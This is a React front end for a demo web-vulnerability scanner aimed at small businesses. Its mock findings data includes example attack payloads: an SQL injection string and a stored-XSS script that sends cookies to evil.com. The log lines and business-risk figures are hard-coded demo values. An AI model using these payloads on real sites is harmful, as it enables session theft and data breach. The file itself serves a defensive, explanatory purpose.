import { useState, useEffect, useRef } from "react";

const FONTS = `@import url('https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap');`;

const styles = `
  ${FONTS}
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  
  :root {
    --bg: #080b0f;
    --surface: #0d1117;
    --surface2: #161b22;
    --border: #21262d;
    --accent: #f0a500;
    --accent2: #e05a5a;
    --accent3: #4fc3a1;
    --accent4: #5b8dee;
    --text: #e6edf3;
    --muted: #7d8590;
    --critical: #f85149;
    --high: #f0a500;
    --medium: #3fb950;
    --low: #4fc3a1;
    --font-mono: 'Space Mono', monospace;
    --font-sans: 'Syne', sans-serif;
  }

  body { background: var(--bg); color: var(--text); font-family: var(--font-sans); min-height: 100vh; }

  .app {
    min-height: 100vh;
    background: var(--bg);
    position: relative;
    overflow: hidden;
  }

  .grid-bg {
    position: fixed; inset: 0; z-index: 0;
    background-image:
      linear-gradient(rgba(240,165,0,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(240,165,0,0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
  }

  .glow-orb {
    position: fixed; border-radius: 50%; filter: blur(120px); pointer-events: none; z-index: 0;
  }
  .orb1 { width: 600px; height: 600px; background: rgba(240,165,0,0.04); top: -200px; right: -100px; }
  .orb2 { width: 400px; height: 400px; background: rgba(224,90,90,0.04); bottom: -100px; left: -100px; }

  .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; position: relative; z-index: 1; }

  /* HEADER */
  .header {
    border-bottom: 1px solid var(--border);
    padding: 20px 0;
    background: rgba(8,11,15,0.8);
    backdrop-filter: blur(20px);
    position: sticky; top: 0; z-index: 100;
  }
  .header-inner { display: flex; align-items: center; gap: 16px; }
  .logo-icon {
    width: 40px; height: 40px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    border-radius: 10px;
    display: flex; align-items: center; justify-content: center;
    font-size: 18px;
    box-shadow: 0 0 20px rgba(240,165,0,0.3);
  }
  .logo-text { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
  .logo-text span { color: var(--accent); }
  .header-badge {
    margin-left: auto;
    font-family: var(--font-mono);
    font-size: 10px;
    padding: 4px 10px;
    border: 1px solid var(--border);
    border-radius: 20px;
    color: var(--muted);
    background: var(--surface);
  }

  /* HERO */
  .hero { padding: 60px 0 40px; text-align: center; }
  .hero-eyebrow {
    font-family: var(--font-mono);
    font-size: 11px;
    color: var(--accent);
    letter-spacing: 3px;
    text-transform: uppercase;
    margin-bottom: 20px;
    display: flex; align-items: center; justify-content: center; gap: 10px;
  }
  .eyebrow-line { width: 30px; height: 1px; background: var(--accent); opacity: 0.5; }
  .hero h1 {
    font-size: clamp(36px, 6vw, 64px);
    font-weight: 800;
    line-height: 1.05;
    letter-spacing: -2px;
    margin-bottom: 18px;
  }
  .hero h1 em { font-style: normal; color: var(--accent); }
  .hero p { font-size: 17px; color: var(--muted); max-width: 540px; margin: 0 auto 40px; line-height: 1.7; font-weight: 400; }

  /* SCANNER INPUT */
  .scanner-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 28px;
    max-width: 680px;
    margin: 0 auto;
    box-shadow: 0 0 60px rgba(0,0,0,0.4);
  }
  .input-row { display: flex; gap: 12px; flex-wrap: wrap; }
  .url-input {
    flex: 1; min-width: 200px;
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 14px 16px;
    font-family: var(--font-mono);
    font-size: 13px;
    color: var(--text);
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .url-input:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(240,165,0,0.1);
  }
  .url-input::placeholder { color: var(--muted); }

  .scan-btn {
    padding: 14px 28px;
    background: linear-gradient(135deg, var(--accent), #d4920a);
    color: #000;
    font-family: var(--font-sans);
    font-weight: 700;
    font-size: 14px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: all 0.2s;
    display: flex; align-items: center; gap: 8px;
    white-space: nowrap;
  }
  .scan-btn:hover { transform: translateY(-1px); box-shadow: 0 8px 24px rgba(240,165,0,0.3); }
  .scan-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }

  .scan-options {
    display: flex; gap: 8px; flex-wrap: wrap; margin-top: 16px;
  }
  .opt-chip {
    font-family: var(--font-mono);
    font-size: 11px;
    padding: 5px 12px;
    border-radius: 20px;
    border: 1px solid var(--border);
    cursor: pointer;
    transition: all 0.15s;
    color: var(--muted);
    background: transparent;
  }
  .opt-chip.active {
    background: rgba(240,165,0,0.1);
    border-color: var(--accent);
    color: var(--accent);
  }

  /* SCANNING ANIMATION */
  .scanning-view {
    text-align: center;
    padding: 60px 0;
  }
  .scan-ring {
    width: 120px; height: 120px;
    border-radius: 50%;
    border: 2px solid var(--border);
    border-top-color: var(--accent);
    animation: spin 1s linear infinite;
    margin: 0 auto 24px;
    position: relative;
  }
  .scan-ring::after {
    content: '🛡️';
    position: absolute;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    font-size: 36px;
    animation: counterSpin 1s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes counterSpin { to { transform: translate(-50%, -50%) rotate(-360deg); } }

  .scan-log {
    font-family: var(--font-mono);
    font-size: 12px;
    color: var(--muted);
    max-width: 480px;
    margin: 0 auto;
    text-align: left;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
    min-height: 120px;
  }
  .log-line { margin-bottom: 4px; opacity: 0; animation: fadeIn 0.3s forwards; }
  .log-line.ok { color: var(--accent3); }
  .log-line.warn { color: var(--accent); }
  .log-line.err { color: var(--critical); }
  @keyframes fadeIn { to { opacity: 1; } }

  /* RESULTS */
  .results { padding: 0 0 80px; }

  .score-section {
    display: grid;
    grid-template-columns: auto 1fr;
    gap: 32px;
    align-items: center;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 32px;
    margin-bottom: 28px;
  }
  @media (max-width: 600px) { .score-section { grid-template-columns: 1fr; text-align: center; } }

  .score-circle {
    width: 120px; height: 120px;
    border-radius: 50%;
    display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    border: 3px solid;
    flex-shrink: 0;
  }
  .score-num { font-size: 42px; font-weight: 800; line-height: 1; }
  .score-label { font-family: var(--font-mono); font-size: 10px; color: var(--muted); letter-spacing: 1px; margin-top: 2px; }

  .score-grade-F { border-color: var(--critical); color: var(--critical); }
  .score-grade-D { border-color: #f07850; color: #f07850; }
  .score-grade-C { border-color: var(--high); color: var(--high); }
  .score-grade-B { border-color: #88c060; color: #88c060; }
  .score-grade-A { border-color: var(--medium); color: var(--medium); }

  .score-info h2 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 8px; }
  .score-info p { color: var(--muted); font-size: 15px; line-height: 1.6; }
  .score-meta { display: flex; gap: 20px; margin-top: 16px; flex-wrap: wrap; }
  .score-stat { font-family: var(--font-mono); font-size: 12px; color: var(--muted); }
  .score-stat strong { color: var(--text); }

  /* VULN CARDS */
  .section-title {
    font-size: 20px; font-weight: 700; letter-spacing: -0.5px;
    margin-bottom: 16px;
    display: flex; align-items: center; gap: 10px;
  }
  .section-title::after { content: ''; flex: 1; height: 1px; background: var(--border); }

  .vuln-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 32px; }

  .vuln-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    overflow: hidden;
    transition: border-color 0.2s;
  }
  .vuln-card:hover { border-color: rgba(240,165,0,0.3); }
  .vuln-card.expanded { border-color: rgba(240,165,0,0.2); }

  .vuln-header {
    display: flex; align-items: center; gap: 14px;
    padding: 16px 20px;
    cursor: pointer;
    user-select: none;
  }
  .severity-badge {
    font-family: var(--font-mono);
    font-size: 10px;
    font-weight: 700;
    padding: 3px 10px;
    border-radius: 20px;
    letter-spacing: 1px;
    flex-shrink: 0;
  }
  .sev-critical { background: rgba(248,81,73,0.15); color: var(--critical); border: 1px solid rgba(248,81,73,0.3); }
  .sev-high { background: rgba(240,165,0,0.12); color: var(--high); border: 1px solid rgba(240,165,0,0.3); }
  .sev-medium { background: rgba(63,185,80,0.1); color: var(--medium); border: 1px solid rgba(63,185,80,0.3); }
  .sev-low { background: rgba(79,195,161,0.1); color: var(--low); border: 1px solid rgba(79,195,161,0.3); }

  .vuln-name { font-weight: 700; font-size: 15px; flex: 1; }
  .vuln-toggle { color: var(--muted); font-size: 18px; transition: transform 0.2s; }
  .vuln-toggle.open { transform: rotate(180deg); }

  .vuln-body {
    padding: 0 20px 20px;
    border-top: 1px solid var(--border);
    display: grid; grid-template-columns: 1fr 1fr; gap: 20px;
  }
  @media (max-width: 640px) { .vuln-body { grid-template-columns: 1fr; } }

  .vuln-section h4 {
    font-family: var(--font-mono); font-size: 10px;
    color: var(--muted); letter-spacing: 2px; text-transform: uppercase;
    margin: 16px 0 8px;
  }
  .vuln-section p { font-size: 14px; color: var(--muted); line-height: 1.65; }
  .vuln-section .impact { color: var(--text); }

  .code-block {
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 12px;
    font-family: var(--font-mono);
    font-size: 11px;
    color: var(--accent);
    overflow-x: auto;
    white-space: pre;
    line-height: 1.5;
    margin-top: 8px;
  }

  .fix-tag {
    display: inline-block;
    font-family: var(--font-mono);
    font-size: 10px;
    padding: 4px 10px;
    border-radius: 6px;
    background: rgba(79,195,161,0.1);
    color: var(--low);
    border: 1px solid rgba(79,195,161,0.2);
    margin-top: 8px;
  }

  /* ROADMAP */
  .roadmap { background: var(--surface); border: 1px solid var(--border); border-radius: 16px; padding: 28px; margin-bottom: 28px; }
  .roadmap-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-top: 20px; }
  @media (max-width: 700px) { .roadmap-grid { grid-template-columns: 1fr; } }

  .roadmap-phase {
    background: var(--bg);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
    position: relative;
  }
  .phase-num {
    font-family: var(--font-mono); font-size: 10px; color: var(--muted);
    letter-spacing: 2px; margin-bottom: 8px;
  }
  .phase-title { font-weight: 700; font-size: 15px; margin-bottom: 4px; }
  .phase-time { font-family: var(--font-mono); font-size: 11px; color: var(--muted); margin-bottom: 14px; }
  .phase-item {
    display: flex; align-items: flex-start; gap: 8px;
    font-size: 13px; color: var(--muted);
    margin-bottom: 8px; line-height: 1.4;
  }
  .phase-dot { width: 6px; height: 6px; border-radius: 50%; margin-top: 5px; flex-shrink: 0; }

  /* RISK SUMMARY */
  .risk-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; margin-bottom: 28px; }
  @media (max-width: 600px) { .risk-grid { grid-template-columns: 1fr; } }

  .risk-card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
  }
  .risk-card-icon { font-size: 28px; margin-bottom: 10px; }
  .risk-card-title { font-weight: 700; font-size: 14px; margin-bottom: 6px; }
  .risk-card-text { font-size: 13px; color: var(--muted); line-height: 1.6; }

  /* AI BADGE */
  .ai-powered {
    display: inline-flex; align-items: center; gap: 6px;
    font-family: var(--font-mono); font-size: 10px;
    padding: 4px 10px; border-radius: 20px;
    border: 1px solid rgba(91,141,238,0.3);
    color: var(--accent4);
    background: rgba(91,141,238,0.08);
    margin-bottom: 12px;
  }
  .ai-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent4); animation: pulse 1.5s infinite; }
  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }

  /* RESET BTN */
  .reset-btn {
    padding: 12px 24px;
    background: transparent;
    border: 1px solid var(--border);
    border-radius: 10px;
    color: var(--muted);
    font-family: var(--font-sans);
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.2s;
    margin-bottom: 32px;
  }
  .reset-btn:hover { border-color: var(--accent); color: var(--accent); }

  /* FOOTER */
  .footer {
    border-top: 1px solid var(--border);
    padding: 24px 0;
    text-align: center;
    font-family: var(--font-mono);
    font-size: 11px;
    color: var(--muted);
  }

  .progress-bar {
    height: 3px; background: var(--border); border-radius: 2px; margin-top: 12px;
    overflow: hidden;
  }
  .progress-fill {
    height: 100%; border-radius: 2px;
    background: linear-gradient(90deg, var(--accent), var(--accent2));
    transition: width 0.4s ease;
  }
`;

// ── MOCK VULNERABILITY DATA ──────────────────────────────────────────────────

const VULN_DB = [
  {
    id: 1, severity: "critical", name: "SQL Injection (Login Form)",
    tech: "User-supplied input is directly concatenated into SQL queries without parameterization, allowing attackers to manipulate database logic.",
    businessImpact: "An attacker can steal ALL customer records, payment data, and credentials in minutes — triggering GDPR fines up to 4% of annual turnover and permanent reputational damage.",
    example: `SELECT * FROM users\nWHERE email = '' OR 1=1 --'\nAND password = 'anything'`,
    fix: "Use parameterized queries / prepared statements",
    effort: "2–4 hours dev time",
  },
  {
    id: 2, severity: "critical", name: "Cross-Site Scripting (XSS) — Stored",
    tech: "User input is stored and reflected back into HTML without sanitization, allowing persistent script injection.",
    businessImpact: "Attackers plant malware on your site that steals your customers' login sessions and payment details. Every visitor becomes a victim — destroying customer trust overnight.",
    example: `<script>document.location=\n  'https://evil.com/steal?c='\n  +document.cookie\n</script>`,
    fix: "Sanitize all output; implement Content Security Policy",
    effort: "1 day for a developer",
  },
  {
    id: 3, severity: "high", name: "Sensitive Data Exposure (HTTP)",
    tech: "The application transmits credentials and session tokens over unencrypted HTTP connections.",
    businessImpact: "Anyone on the same Wi-Fi (coffee shop, office) can intercept customer passwords and credit card numbers in plain text. A single incident = regulatory breach notification obligations.",
    example: `GET /login HTTP/1.1\nHost: yoursite.com\n\nemail=admin@co.com\n&password=secret123`,
    fix: "Force HTTPS; install SSL/TLS certificate",
    effort: "< 1 hour (free via Let's Encrypt)",
  },
  {
    id: 4, severity: "high", name: "Broken Authentication (No Rate Limit)",
    tech: "Login endpoint accepts unlimited authentication attempts without lockout or CAPTCHA, enabling brute-force attacks.",
    businessImpact: "Automated bots can guess employee passwords in hours, granting attackers full admin access. Your business email, finances, and customer data could all be compromised.",
    example: `POST /api/login x 10,000\nContent-Type: application/json\n{"email":"admin@co.com",\n "password":"<wordlist>"}`,
    fix: "Implement rate limiting + account lockout after 5 attempts",
    effort: "4–6 hours dev time",
  },
  {
    id: 5, severity: "medium", name: "Missing Security Headers",
    tech: "HTTP response headers like X-Frame-Options, X-Content-Type-Options, and Referrer-Policy are absent.",
    businessImpact: "Your site can be embedded in invisible iframes on malicious pages, tricking your customers into 'clicking' buttons they can't see (clickjacking). Moderate risk, easy to fix.",
    example: `HTTP/1.1 200 OK\nContent-Type: text/html\n# Missing:\n# X-Frame-Options: DENY\n# CSP: default-src 'self'`,
    fix: "Add security headers in server config (nginx/Apache)",
    effort: "30 minutes",
  },
  {
    id: 6, severity: "low", name: "Verbose Error Messages",
    tech: "Stack traces and database error messages are exposed in production responses, leaking internal architecture details.",
    businessImpact: "Reveals your tech stack, file paths, and database schema to attackers — giving them a free map of your infrastructure. Low immediate risk but reduces cost of targeted attacks.",
    example: `ERROR: relation "users_v2"\nnot found at character 57\nFILE: /var/www/app/db.py\nLINE: 142, in get_user`,
    fix: "Disable debug mode; log errors server-side only",
    effort: "15 minutes",
  },
];

const LOG_LINES = [
  { text: "► Initializing scanner engine...", cls: "" },
  { text: "► Resolving DNS and mapping endpoints...", cls: "" },
  { text: "► Testing for SQL Injection vectors...", cls: "warn" },
  { text: "  ✗ VULNERABLE: /login [param: email]", cls: "err" },
  { text: "► Testing for XSS payloads...", cls: "warn" },
  { text: "  ✗ VULNERABLE: /comments [param: body]", cls: "err" },
  { text: "► Checking TLS/SSL configuration...", cls: "" },
  { text: "  ✗ HTTP detected on sensitive endpoints", cls: "err" },
  { text: "► Checking rate limiting...", cls: "" },
  { text: "  ✗ No rate limit on /api/login", cls: "err" },
  { text: "► Auditing HTTP security headers...", cls: "" },
  { text: "  ⚠ 5 headers missing", cls: "warn" },
  { text: "► Checking error handling...", cls: "" },
  { text: "  ⚠ Verbose errors in production mode", cls: "warn" },
  { text: "✓ Scan complete. Generating AI risk report...", cls: "ok" },
];

const BUSINESS_RISKS = [
  { icon: "💸", title: "Potential Financial Loss", text: "Based on findings, a successful attack could result in $50K–$500K in damages via data breach penalties, ransomware, and customer refunds." },
  { icon: "⚖️", title: "Regulatory Exposure", text: "2 critical findings trigger mandatory breach notification under GDPR/CCPA. Non-compliance fines can reach 4% of annual revenue." },
  { icon: "🔒", title: "Customer Trust at Risk", text: "A public breach leads to avg. 31% customer churn in SMBs within 6 months. Recovery takes 2–3 years." },
  { icon: "⏰", title: "Time to Exploit", text: "The SQL Injection and XSS vulnerabilities could be exploited by an automated bot within hours of discovery — not days." },
];

// ── COMPONENT ─────────────────────────────────────────────────────────────────

export default function SecuritySentinel() {
  const [url, setUrl] = useState("");
  const [selectedOpts, setSelectedOpts] = useState(["xss", "sqli", "headers"]);
  const [phase, setPhase] = useState("idle"); // idle | scanning | results
  const [logLines, setLogLines] = useState([]);
  const [progress, setProgress] = useState(0);
  const [vulnerabilities, setVulnerabilities] = useState([]);
  const [expanded, setExpanded] = useState({});
  const [aiLoading, setAiLoading] = useState(false);
  const [aiSummary, setAiSummary] = useState("");
  const logRef = useRef(null);

  const opts = [
    { id: "xss", label: "XSS" },
    { id: "sqli", label: "SQL Injection" },
    { id: "headers", label: "Security Headers" },
    { id: "ssl", label: "SSL/TLS" },
    { id: "auth", label: "Auth Flaws" },
  ];

  const toggleOpt = (id) =>
    setSelectedOpts((p) => p.includes(id) ? p.filter((x) => x !== id) : [...p, id]);
   
  const toggleExpanded = (id) => {
  setExpanded(prev => ({
    ...prev,
    [id]: !prev[id]
  }));
};

const startScan = async () => {
let finalUrl = url.trim();

// auto add https if missing
if (!finalUrl.startsWith("http")) {
  finalUrl = "https://" + finalUrl;
}
  setPhase("scanning");
  setLogLines([]);
  setProgress(0);
  setAiSummary("");

  // Animate log while waiting for real scan
  const logInterval = setInterval(() => {
    setLogLines(p => {
      if (p.length >= LOG_LINES.length) {
        clearInterval(logInterval);
        return p;
      }
      return [...p, { ...LOG_LINES[p.length], key: p.length }];
    });
    setProgress(p => Math.min(p + 8, 90));
  }, 500);

  try {
    // Call your real Flask backend
   const API = "http://localhost:5000";

const res = await fetch(`${API}/scan`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    url: finalUrl,
    modules: selectedOpts
  })
});

    const data = await res.json();
    clearInterval(logInterval);
    setProgress(100);
    setVulnerabilities(data.vulnerabilities);  // ← real results
    setPhase("results");
    fetchAISummary(data.vulnerabilities);

  } 
    catch (err) {
  console.error(err);
  alert("Backend not running. Start Flask server on port 5000.");
  setPhase("idle");
}
};

  const fetchAISummary = async (vulns) => {
  setAiLoading(true);

  try {
    const res = await fetch("http://localhost:5000/ai-summary", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ vulnerabilities: vulns })
    });

    const data = await res.json();
    const text = data.content?.[0]?.text || "No summary available";

    setAiSummary(text);

  } catch {
    setAiSummary("Could not generate AI summary.");
  }

  setAiLoading(false);
};
  // REPLACE WITH THIS:
const critCount = vulnerabilities.filter(v => v.severity === "critical").length;
const highCount = vulnerabilities.filter(v => v.severity === "high").length;
const score = vulnerabilities.length === 0
  ? 100
  : Math.max(5, 100 - critCount * 30 - highCount * 15 - vulnerabilities.length * 3);

  const gradeInfo = score < 30
    ? { grade: "F", label: "Critical Risk" }
    : score < 50 ? { grade: "D", label: "High Risk" }
    : score < 70 ? { grade: "C", label: "Moderate Risk" }
    : score < 85 ? { grade: "B", label: "Low Risk" }
    : { grade: "A", label: "Secure" };

  return (
    <>
      <style>{styles}</style>
      <div className="app">
        <div className="grid-bg" />
        <div className="glow-orb orb1" />
        <div className="glow-orb orb2" />

        {/* HEADER */}
        <header className="header">
          <div className="container">
            <div className="header-inner">
              <div className="logo-icon">🛡️</div>
              <div className="logo-text">Security<span>Sentinel</span></div>
              <div className="header-badge">v1.0 · SMB Edition</div>
            </div>
          </div>
        </header>

        {/* IDLE / SCANNER */}
        {phase === "idle" && (
          <>
            <section className="hero">
              <div className="container">
                <div className="hero-eyebrow">
                  <span className="eyebrow-line" />
                  Automated Vulnerability Scanner
                  <span className="eyebrow-line" />
                </div>
                <h1>Find security flaws<br />before <em>attackers do</em></h1>
                <p>Enterprise-grade vulnerability scanning with plain-English risk reports built for small business owners — no technical expertise required.</p>

                <div className="scanner-card">
                  <div className="input-row">
                    <input
                      className="url-input"
                      type="text"
                      placeholder="https://yourbusiness.com"
                      value={url}
                      onChange={e => setUrl(e.target.value)}
                      onKeyDown={e => e.key === "Enter" && startScan()}
                    />
                    <button className="scan-btn" onClick={startScan} disabled={!url.trim()}>
                      ⚡ Scan Now
                    </button>
                  </div>
                  <div className="scan-options">
                    {opts.map(o => (
                      <button
                        key={o.id}
                        className={`opt-chip ${selectedOpts.includes(o.id) ? "active" : ""}`}
                        onClick={() => toggleOpt(o.id)}
                      >
                        {selectedOpts.includes(o.id) ? "✓ " : ""}{o.label}
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            </section>

            {/* FEATURE STRIP */}
            <div className="container" style={{ paddingBottom: 80 }}>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 16 }}>
                {[
                  { icon: "🔍", title: "Deep Scanning", text: "Tests 40+ vulnerability classes including OWASP Top 10" },
                  { icon: "📊", title: "Business Reports", text: "Zero jargon. Risk explained in dollars, reputation, and customers" },
                  { icon: "🗺️", title: "Fix Roadmap", text: "Prioritized action plan sorted by impact and ease of fix" },
                ].map(f => (
                  <div key={f.title} style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 12, padding: "20px 18px" }}>
                    <div style={{ fontSize: 28, marginBottom: 10 }}>{f.icon}</div>
                    <div style={{ fontWeight: 700, marginBottom: 6, fontSize: 15 }}>{f.title}</div>
                    <div style={{ fontSize: 13, color: "var(--muted)", lineHeight: 1.6 }}>{f.text}</div>
                  </div>
                ))}
              </div>
            </div>
          </>
        )}

        {/* SCANNING */}
        {phase === "scanning" && (
          <div className="container">
            <div className="scanning-view">
              <div className="scan-ring" />
              <h2 style={{ fontWeight: 800, fontSize: 22, marginBottom: 8 }}>Scanning {url}</h2>
              <p style={{ color: "var(--muted)", marginBottom: 24, fontFamily: "var(--font-mono)", fontSize: 12 }}>
                {progress}% complete
              </p>
              <div className="progress-bar" style={{ maxWidth: 480, margin: "0 auto 24px" }}>
                <div className="progress-fill" style={{ width: `${progress}%` }} />
              </div>
              <div className="scan-log" ref={logRef}>
                {logLines.map((l, i) => (
                  <div
                    key={l.key}
                    className={`log-line ${l.cls}`}
                    style={{ animationDelay: `${i * 0.05}s` }}
                  >
                    {l.text}
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* RESULTS */}
        {phase === "results" && (
          <div className="container results">
            <button className="reset-btn" onClick={() => { setPhase("idle"); setUrl(""); }}>
              ← New Scan
            </button>

            {/* AI SUMMARY */}
            <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 16, padding: 28, marginBottom: 28 }}>
              <div className="ai-powered"><span className="ai-dot" /> AI-Generated Executive Summary</div>
              {aiLoading ? (
                <p style={{ color: "var(--muted)", fontStyle: "italic", fontSize: 14 }}>Generating business risk assessment…</p>
              ) : (
                <p style={{ fontSize: 15, lineHeight: 1.75, color: "var(--text)" }}>{aiSummary}</p>
              )}
            </div>

            {/* SCORE */}
            <div className="score-section">
              <div className={`score-circle score-grade-${gradeInfo.grade}`}>
                <div className="score-num">{score}</div>
                <div className="score-label">/ 100</div>
              </div>
              <div className="score-info">
                <h2>Security Grade: {gradeInfo.grade} — {gradeInfo.label}</h2>
                <p>Your website has significant vulnerabilities that require immediate attention. Without remediation, you are at high risk of a data breach within the next 90 days.</p>
                <div className="score-meta">
                  <div className="score-stat">Target: <strong>{url}</strong></div>
                  <div className="score-stat">Found: <strong style={{ color: "var(--critical)" }}>{critCount} Critical</strong>, <strong style={{ color: "var(--high)" }}>{highCount} High</strong></div>
                  <div className="score-stat">Scan Time: <strong>12.4s</strong></div>
                </div>
              </div>
            </div>

            {/* BUSINESS RISKS */}
            <h3 className="section-title">Business Impact Overview</h3>
            <div className="risk-grid">
              {BUSINESS_RISKS.map(r => (
                <div key={r.title} className="risk-card">
                  <div className="risk-card-icon">{r.icon}</div>
                  <div className="risk-card-title">{r.title}</div>
                  <div className="risk-card-text">{r.text}</div>
                </div>
              ))}
            </div>

            {/* VULNERABILITIES */}
            <h3 className="section-title">Detected Vulnerabilities ({vulnerabilities.length})</h3>
            <div className="vuln-list">
              {vulnerabilities?.map(v => (
                <div key={v.id} className={`vuln-card ${expanded[v.id] ? "expanded" : ""}`}>
                  <div className="vuln-header" onClick={() => toggleExpanded(v.id)}>
                    <span className={`severity-badge sev-${v.severity}`}>{v.severity.toUpperCase()}</span>
                    <span className="vuln-name">{v.name}</span>
                    <span style={{ fontFamily: "var(--font-mono)", fontSize: 11, color: "var(--muted)", marginRight: 8 }}>{v.effort}</span>
                    <span className={`vuln-toggle ${expanded[v.id] ? "open" : ""}`}>⌄</span>
                  </div>
                  {expanded[v.id] && (
                    <div className="vuln-body">
                      <div className="vuln-section">
                        <h4>Business Impact</h4>
                        <p className="impact">{v.businessImpact}</p>
                        <span className="fix-tag">✓ Fix: {v.fix}</span>
                      </div>
                      <div className="vuln-section">
                        <h4>Technical Detail</h4>
                        <p>{v.tech}</p>
                        <div className="code-block">{v.example}</div>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>

            {/* ROADMAP */}
            <h3 className="section-title">Priority Remediation Roadmap</h3>
            <div className="roadmap">
              <p style={{ color: "var(--muted)", fontSize: 14, marginBottom: 4 }}>
                Follow these phases to go from <strong style={{ color: "var(--critical)" }}>Grade F → Grade A</strong> in under 2 weeks.
              </p>
              <div className="roadmap-grid">
                {[
                  {
                    num: "PHASE 01", title: "Stop the Bleeding", time: "This Week (Days 1–3)",
                    color: "var(--critical)",
                    items: [
                      { text: "Fix SQL Injection with parameterized queries", dot: "var(--critical)" },
                      { text: "Remove XSS vulnerability — sanitize all user inputs", dot: "var(--critical)" },
                      { text: "Force HTTPS on all pages immediately", dot: "var(--critical)" },
                    ]
                  },
                  {
                    num: "PHASE 02", title: "Harden Access", time: "Next Week (Days 4–7)",
                    color: "var(--high)",
                    items: [
                      { text: "Add rate limiting + lockout to login endpoint", dot: "var(--high)" },
                      { text: "Enable 2-factor authentication for admin accounts", dot: "var(--high)" },
                      { text: "Review and rotate all API keys and passwords", dot: "var(--high)" },
                    ]
                  },
                  {
                    num: "PHASE 03", title: "Tune & Monitor", time: "Ongoing (Week 2+)",
                    color: "var(--medium)",
                    items: [
                      { text: "Add all missing HTTP security headers", dot: "var(--medium)" },
                      { text: "Disable debug/verbose errors in production", dot: "var(--medium)" },
                      { text: "Set up monthly automated security scans", dot: "var(--medium)" },
                    ]
                  },
                ].map(ph => (
                  <div key={ph.num} className="roadmap-phase">
                    <div className="phase-num">{ph.num}</div>
                    <div className="phase-title" style={{ color: ph.color }}>{ph.title}</div>
                    <div className="phase-time">{ph.time}</div>
                    {ph.items.map((item, i) => (
                      <div key={i} className="phase-item">
                        <div className="phase-dot" style={{ background: item.dot }} />
                        {item.text}
                      </div>
                    ))}
                  </div>
                ))}
              </div>
            </div>

            {/* CTA */}
            <div style={{ background: "linear-gradient(135deg, rgba(240,165,0,0.08), rgba(224,90,90,0.06))", border: "1px solid rgba(240,165,0,0.2)", borderRadius: 16, padding: 32, textAlign: "center" }}>
              <h3 style={{ fontSize: 22, fontWeight: 800, marginBottom: 10 }}>Ready to fix these issues?</h3>
              <p style={{ color: "var(--muted)", marginBottom: 24, maxWidth: 480, margin: "0 auto 24px" }}>
                Share this report with your developer. Every item has an estimated fix time — most can be resolved in under a day.
              </p>
              <div style={{ display: "flex", gap: 12, justifyContent: "center", flexWrap: "wrap" }}>
                <button className="scan-btn" onClick={() => window.print()}>⬇ Download Report</button>
                <button className="reset-btn" style={{ margin: 0 }} onClick={() => { setPhase("idle"); setUrl(""); }}>Scan Another Site</button>
              </div>
            </div>
          </div>
        )}

        <footer className="footer">
          <div className="container">
            SecuritySentinel · Built for SMB Founders · Findings are simulated for demo purposes
          </div>
        </footer>
      </div>
    </>
  );
}